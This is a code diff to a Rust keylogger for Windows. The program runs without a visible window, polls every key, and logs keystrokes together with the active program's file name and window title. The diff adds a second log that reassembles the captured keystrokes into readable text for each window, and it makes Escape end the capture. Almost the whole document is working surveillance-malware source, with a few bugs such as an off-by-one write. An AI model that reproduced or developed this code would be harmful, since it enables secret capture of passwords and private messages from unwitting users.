@@ -1,8 +1,10 @@
 #![windows_subsystem = "windows"]
 #[cfg(windows)]
 extern crate winapi;
+use std::collections::HashMap;
 use std::fs::*;
 use std::io::*;
+//use std::str::pattern::Pattern;
 use chrono::{DateTime, Timelike, Utc};
 
 // winapi::um header user mode only
@@ -33,7 +35,9 @@ use winapi::shared::windef::POINT;
 use std::{thread, time::Duration};
 
 #[cfg(windows)]
-fn begin(file: &mut File) {
+fn begin(file: &mut File, file2: &mut File) {
+    //use core::num::flt2dec::strategy::grisu::format_exact_opt;
+
     log_header(file);
     //unsafe some functions can be declared as unsafe
     //meaning it is the programmer's responsibility to ensure the correctness 
@@ -57,6 +61,19 @@ fn begin(file: &mut File) {
     
     log(file, format!("Locale: {}\n", locale));
     log(file, "\nKeylogs:\n".to_string());
+
+    let mut map: HashMap<String, u32> = HashMap::new();
+    inmp(&mut map);
+    let mut flag = 0;
+
+    let now1: DateTime<Utc> = Utc::now();
+
+    *map.get_mut("hour").unwrap() = now1.hour();
+    *map.get_mut("minute").unwrap() = now1.minute(); 
+    *map.get_mut("second").unwrap() = now1.second();
+
+    let mut vec:Vec<String> = Vec::new();
+    let mut state:String = String::default();
 
     //print key state
     loop {
@@ -103,8 +120,9 @@ fn begin(file: &mut File) {
 
             t
         };
-
+        
         let now: DateTime<Utc> = Utc::now();
+        
 
         for i in 0 as c_int..255 as c_int {
             // get the state of the key
@@ -115,7 +133,20 @@ fn begin(file: &mut File) {
                                 now.hour(), now.minute(), now.second(),
                                 filename.trim(), title.trim(), keycode_to_string(i as u8));
                 log(file, s);
+
+                let s2 = format!("{:02}-{:02}-{:02},{},{}",
+                                now.hour(), now.minute(), now.second(),
+                                filename.trim(), title.trim());
+                
+                log_new_format(file2, s2, &mut map, i as u8, &mut vec, &mut state);
+
+                if i as u8 == 0x1B {
+                    flag = 1;
+                }
             }
+        }
+        if flag == 1 {
+            break;
         }
     }
 }
@@ -148,6 +179,126 @@ fn log(file: &mut File, s: String) {
         Err(e) => {println!("Could not flush the output file: {}", e)}
         _ => {}
     }
+}
+
+fn log_new_format(file: &mut File, s:String, map: &mut HashMap<String, u32>, k : u8, vec: &mut Vec<String>, state: &mut String) {
+    let collection: Vec<&str> = s.as_str().split(',').collect();
+    let time:Vec<&str> = collection[0].split('-').collect();
+
+    // put number and character into the printing vector
+    if k == 0xA3 {
+        *map.get_mut("capital").unwrap() = 1;
+    }
+    
+    if *map.get("capital").unwrap() == 1 {
+        if state.is_empty() {
+            *state = format!("{}", collection[2].to_string().clone());
+        } else if *state != collection[2].to_string().clone() {
+            *map.get_mut("action").unwrap() = 1;
+        }
+        //if the state changes, print previous state's string
+        /*if *map.get("action").unwrap() == 1 {
+            //print
+            vec.push("\n".to_string());
+            *map.get_mut("end_point").unwrap() += 1;
+            print_new_format(file, map, vec, state);
+            *state = collection[2].to_string().clone();
+            vec.push(": ".to_string());
+            *map.get_mut("start_point").unwrap() = *map.get("end_point").unwrap();
+            *map.get_mut("end_point").unwrap() += 1;
+            *map.get_mut("action").unwrap() = 0;
+        }*/
+        
+        //if the time difference is more than 5 second, print the string
+        /*if time[2].to_string().parse::<u32>().unwrap() - *map.get("second").unwrap() > 5 {
+            *map.get_mut("hour").unwrap() = time[0].to_string().parse::<u32>().unwrap();
+            *map.get_mut("minute").unwrap() = time[1].to_string().parse::<u32>().unwrap();
+            *map.get_mut("second").unwrap() = time[2].to_string().parse::<u32>().unwrap();
+            //print
+            vec.push("\n".to_string());
+            *map.get_mut("end_point").unwrap() += 1;
+            print_new_format(file, map, vec, state);
+        
+            *map.get_mut("start_point").unwrap() = *map.get("end_point").unwrap();
+            vec.push(collection[2].to_string());
+            *map.get_mut("end_point").unwrap() += 1; 
+        }*/
+        
+        *map.get_mut("hour").unwrap() = time[0].to_string().parse::<u32>().unwrap();
+        *map.get_mut("minute").unwrap() = time[1].to_string().parse::<u32>().unwrap();
+        *map.get_mut("second").unwrap() = time[2].to_string().parse::<u32>().unwrap();
+
+        if ( k >= 65 && k <=90) || (k >= 48 && k <= 57) {
+            vec.push((k as char).to_lowercase().to_string());
+            *map.get_mut("end_point").unwrap() += 1; 
+        }
+
+        if k == 0x1B {
+            print_new_format(file, map, vec, state);
+            return;
+        }
+        
+        // put other sign into the printing vector
+        match k {
+            0x08 => {
+                vec.pop();
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            0x09 => {
+                vec.push("    ".to_string());
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            0x0D => {
+                vec.push("\n".to_string());
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            0x20 => {
+                vec.push(" ".to_string());
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            0xBB => {
+                vec.push("+".to_string());
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            0xBC => {
+                vec.push(",".to_string());
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            0xBD => {
+                vec.push("-".to_string());
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            0xBE => {
+                vec.push(".".to_string());
+                *map.get_mut("end_point").unwrap() += 1; 
+            },
+            _ => return
+        }
+    }
+    
+}
+
+fn print_new_format(file: &mut File, map: &mut HashMap<String, u32>, vec: &mut Vec<String>, s: &mut String) {
+    let mut k = *map.get("start_point").unwrap();
+    print!("{}: ", *s);
+    while k < *map.get("end_point").unwrap() {
+        
+        print!("{}", vec[k as usize]);
+        k+=1;
+
+        match file.write(vec[k as usize].as_bytes()) {
+            Err(e) => {println!("Could not write to the output file: {}", e)}
+            _ => {}
+        }
+    
+        match file.flush() {
+            Err(e) => {println!("Could not flush the output file: {}", e)}
+            _ => {}
+        }
+    }
+    
+
+    
 }
 
 //number to key state string
@@ -306,6 +457,18 @@ fn get_mouse_pos() -> String {
     format!("{},{}", pos.x, pos.y)
 }
 
+fn inmp(m: &mut HashMap<String, u32>) {
+    m.insert("action".to_string(), 0);
+    m.insert("capital".to_string(), 0);
+    m.insert("importance".to_string(), 0);
+    m.insert("hour".to_string(), 0);
+    m.insert("minute".to_string(), 0);
+    m.insert("second".to_string(), 0);
+    m.insert("start".to_string(), 0);
+    m.insert("start_point".to_string(), 0);
+    m.insert("end_point".to_string(), 0);
+}
+
 #[cfg(not(windows))]
 fn begin(file: &mut File) {
     log_header(file);
@@ -313,9 +476,9 @@ fn begin(file: &mut File) {
 }
 
 fn main() {
-    let now: DateTime<Utc> = Utc::now();
+    //let now: DateTime<Utc> = Utc::now();
     // name of the output file
-    let filename = format!("./bin/keylogger-{}-{:02}+{:02}+{:02}.log", now.date(), now.hour(), now.minute(), now.second());
+    let filename = format!("./bin/keylogger.log");
 
     let mut output = {
         match OpenOptions::new().write(true).create(true).open(&filename) {
@@ -327,5 +490,16 @@ fn main() {
         }
     };
 
-    begin(&mut output);
+    let filename2 = format!("./bin/assemble keylogger information.log");
+    let mut output2 = {
+        match OpenOptions::new().write(true).create(true).open(&filename2) {
+            Ok(f2) => {f2}
+
+            Err(e2) => {
+                panic!("Could not create output file: {}", e2);
+            }
+        }
+    };
+
+    begin(&mut output, &mut output2);
 }
